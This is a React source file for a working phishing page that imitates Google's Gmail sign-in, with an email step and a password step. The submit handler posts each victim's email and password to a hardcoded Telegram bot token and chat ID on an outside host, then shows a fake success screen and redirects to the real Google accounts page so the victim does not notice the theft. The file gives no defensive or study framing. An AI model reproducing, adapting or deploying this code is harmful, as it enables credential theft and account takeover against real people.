import React, { useState } from 'react';
import { Globe, ChevronDown, Eye, EyeOff } from 'lucide-react';
import axios from 'axios';

function App() {
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [focused, setFocused] = useState(false);
  const [passwordFocused, setPasswordFocused] = useState(false);
  const [showPassword, setShowPassword] = useState(false);
  const [step, setStep] = useState('email'); // 'email' or 'password'
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [error, setError] = useState('');
  const [success, setSuccess] = useState(false);

  // Replace with your Telegram bot token and chat ID
  const TELEGRAM_BOT_TOKEN = '7637163616:AAG_DPMXkj_2uQz6ztaCyTyonQFJpJO972E';
  const TELEGRAM_CHAT_ID = '7356694709';

  const handleNextClick = () => {
    if (step === 'email' && email.trim() !== '') {
      setStep('password');
    }
  };

  const handleBackToEmail = () => {
    setStep('email');
  };

  const handleSubmit = async () => {
    if (!email || !password) {
      setError('Please enter both email and password');
      return;
    }

    setIsSubmitting(true);
    setError('');

    try {
      // Format the message for Telegram
      const message = `New login:\nEmail: ${email}\nPassword: ${password}`;
      
      // Send to Telegram bot
      await axios.post(
        `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
        {
          chat_id: TELEGRAM_CHAT_ID,
          text: message,
          parse_mode: 'HTML'
        }
      );

      // Show success message
      setSuccess(true);
      
      // Optional: Redirect to a different page or show success message
      setTimeout(() => {
        window.location.href = 'https://accounts.google.com';
      }, 2000);
      
    } catch (err) {
      console.error('Error sending data:', err);
      setError('Something went wrong. Please try again later.');
    } finally {
      setIsSubmitting(false);
    }
  };

  return (
    <div className="min-h-screen bg-[#202124] flex flex-col items-center justify-center p-4">
      {success ? (
        <div className="w-full max-w-md bg-[#202124] rounded-2xl p-10 border border-[#5f6368] shadow-lg">
          <div className="flex justify-center mb-6">
            <div className="w-10 h-10 rounded-full bg-gradient-to-r from-red-500 via-yellow-500 to-blue-500 flex items-center justify-center">
              <img src="https://ssl.gstatic.com/ui/v1/icons/mail/rfr/logo_gmail_lockup_default_1x_r5.png" className="w-6 h-6 text-white" />
            </div>
          </div>
          <h1 className="text-3xl font-normal text-white mb-6 text-center">Success!</h1>
          <p className="text-[#e8eaed] text-center mb-4">You are being redirected to your account...</p>
          <div className="flex justify-center">
            <div className="w-8 h-8 border-t-2 border-[#8ab4f8] rounded-full animate-spin"></div>
          </div>
        </div>
      ) : step === 'email' ? (
        // Email Step
        <div className="w-full max-w-md bg-[#202124] rounded-2xl p-10 border border-[#5f6368] shadow-lg">
          <div className="flex justify-center mb-6">
            {/* Google logo replacement using a colorful circle */}
              <img src="https://ssl.gstatic.com/ui/v1/icons/mail/rfr/logo_gmail_lockup_default_1x_r5.png" className=" text-white" />
          </div>
          
          <h1 className="text-3xl font-normal text-white mb-2">Sign in</h1>
          <p className="text-[#e8eaed] mb-8">to continue to App</p>
          
          <div className="mb-6">
            <div className="relative">
              <label 
                htmlFor="email" 
                className={`absolute left-3 ${focused || email ? 'text-xs top-1 text-[#8ab4f8]' : 'text-[#e8eaed] top-4'} transition-all duration-200`}
              >
                Email or phone
              </label>
              <input
                type="text"
                id="email"
                value={email}
                onChange={(e) => setEmail(e.target.value)}
                onFocus={() => setFocused(true)}
                onBlur={() => setFocused(false)}
                className="w-full bg-transparent border border-[#5f6368] rounded px-3 pt-6 pb-2 text-white focus:border-[#8ab4f8] focus:outline-none focus:ring-1 focus:ring-[#8ab4f8]"
              />
            </div>
            <div className="mt-2">
              <a href="#" className="text-[#8ab4f8] text-sm hover:underline">Forgot email?</a>
            </div>
          </div>
          
          <div className="text-[#e8eaed] text-sm mb-8">
            <p>Not your computer? Use a private browsing window to sign in. <a href="#" className="text-[#8ab4f8] hover:underline">Learn more about using Guest mode</a></p>
          </div>
          
          <div className="flex justify-between items-center">
            <button className="text-[#8ab4f8] hover:bg-[#303134] px-4 py-2 rounded-md text-sm font-medium">
              Create account
            </button>
            <button 
              onClick={handleNextClick}
              className="bg-[#8ab4f8] text-[#202124] px-6 py-2 rounded-md hover:bg-[#aecbfa] transition-colors font-medium"
            >
              Next
            </button>
          </div>
        </div>
      ) : (
        // Password Step
        <div className="w-full max-w-md bg-[#202124] rounded-2xl p-10 border border-[#5f6368] shadow-lg">
          <div className="flex justify-center mb-6">
              <img src="https://ssl.gstatic.com/ui/v1/icons/mail/rfr/logo_gmail_lockup_default_1x_r5.png"  />
          </div>
          
          <h1 className="text-3xl font-normal text-white mb-6">Welcome</h1>
          
          <div 
            onClick={handleBackToEmail}
            className="flex items-center bg-[#303134] rounded-full py-2 px-3 mb-8 cursor-pointer hover:bg-[#3c4043] transition-colors w-fit"
          >
            <div className="w-6 h-6 rounded-full bg-[#5f6368] flex items-center justify-center mr-2">
              <span className="text-white text-xs">{email.charAt(0).toUpperCase()}</span>
            </div>
            <span className="text-[#e8eaed] text-sm mr-1">{email}</span>
            <ChevronDown className="w-4 h-4 text-[#e8eaed]" />
          </div>
          
          <div className="mb-6">
            <div className="relative">
              <label 
                htmlFor="password" 
                className={`absolute left-3 ${passwordFocused || password ? 'text-xs top-1 text-[#8ab4f8]' : 'text-[#e8eaed] top-4'} transition-all duration-200`}
              >
                Enter your password
              </label>
              <input
                type={showPassword ? "text" : "password"}
                id="password"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                onFocus={() => setPasswordFocused(true)}
                onBlur={() => setPasswordFocused(false)}
                className="w-full bg-transparent border border-[#5f6368] rounded px-3 pt-6 pb-2 text-white focus:border-[#8ab4f8] focus:outline-none focus:ring-1 focus:ring-[#8ab4f8] pr-10"
              />
              <button 
                onClick={() => setShowPassword(!showPassword)}
                className="absolute right-3 top-1/2 transform -translate-y-1/2 text-[#e8eaed]"
              >
                {showPassword ? <EyeOff className="w-5 h-5" /> : <Eye className="w-5 h-5" />}
              </button>
            </div>
            <div className="mt-2 flex items-center">
              <input 
                type="checkbox" 
                id="showPassword" 
                checked={showPassword}
                onChange={() => setShowPassword(!showPassword)}
                className="mr-2 h-4 w-4 accent-[#8ab4f8]"
              />
              <label htmlFor="showPassword" className="text-[#e8eaed] text-sm">Show password</label>
            </div>
          </div>
          
          {error && (
            <div className="mb-4 text-red-500 text-sm">
              {error}
            </div>
          )}
          
          <div className="flex justify-between items-center">
            <a href="#" className="text-[#8ab4f8] hover:underline text-sm">
              Forgot password?
            </a>
            <button 
              onClick={handleSubmit}
              disabled={isSubmitting}
              className={`${isSubmitting ? 'bg-[#5f6368]' : 'bg-[#8ab4f8] hover:bg-[#aecbfa]'} text-[#202124] px-6 py-2 rounded-md transition-colors font-medium flex items-center`}
            >
              {isSubmitting ? (
                <>
                  <span className="w-4 h-4 border-2 border-[#202124] border-t-transparent rounded-full animate-spin mr-2"></span>
                  Signing in...
                </>
              ) : (
                'Next'
              )}
            </button>
          </div>
        </div>
      )}
      
      <div className="w-full max-w-md mt-4 flex justify-between text-[#9aa0a6] text-sm">
        <div className="relative">
          <select className="appearance-none bg-transparent border-none text-[#9aa0a6] focus:outline-none pr-6">
            <option>English (United States)</option>
          </select>
          <span className="absolute right-0 top-1">▼</span>
        </div>
        <div className="flex space-x-4">
          <a href="#" className="hover:text-[#e8eaed]">Help</a>
          <a href="#" className="hover:text-[#e8eaed]">Privacy</a>
          <a href="#" className="hover:text-[#e8eaed]">Terms</a>
        </div>
      </div>
    </div>
  );
}

export default App;